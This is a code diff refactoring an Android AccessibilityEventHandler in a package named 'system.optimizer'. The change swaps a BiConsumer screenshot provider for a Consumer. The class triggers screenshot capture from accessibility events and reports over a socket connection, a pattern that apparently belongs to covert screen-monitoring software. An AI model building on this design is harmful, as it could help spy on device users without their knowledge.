@@ -3,7 +3,7 @@ package com.system.optimizer.event;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
-import java.util.function.BiConsumer;
+import java.util.function.Consumer;
 
 import android.os.Handler;
 import android.os.Looper;
@@ -11,7 +11,7 @@ import android.os.Looper;
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
 import com.system.optimizer.config.ConfigData;
-import com.system.optimizer.service.ScreenshotCallback;
+import com.system.optimizer.service.ScreenshotResultHandler.ScreenshotCallback;
 
 import android.view.accessibility.AccessibilityEvent;
 
@@ -28,7 +28,7 @@ public class AccessibilityEventHandler {
     private static final long DELAY_MS = 2000;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final BiConsumer<ScreenshotCallback, Integer> captureProvider;
+    private final Consumer<ScreenshotCallback> captureProvider;
     private final AppConfig appConfig;
     private final SocketManager socketManager;
     private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
@@ -37,7 +37,7 @@ public class AccessibilityEventHandler {
     private final Runnable executeRunnable;
     private boolean isManual = false;
 
-    public AccessibilityEventHandler(BiConsumer<ScreenshotCallback, Integer> captureProvider, AppConfig appConfig, SocketManager socketManager) {
+    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig, SocketManager socketManager) {
         if (captureProvider == null) {
             throw new IllegalArgumentException("Capture provider cannot be null");
         }
@@ -90,7 +90,7 @@ public class AccessibilityEventHandler {
                 public void onError(String errorMessage) {
                     socketManager.sendEvent("screenshot_error", errorMessage);
                 }
-            }, config.getScreenshotQuality());
+            });
         };
     }
 
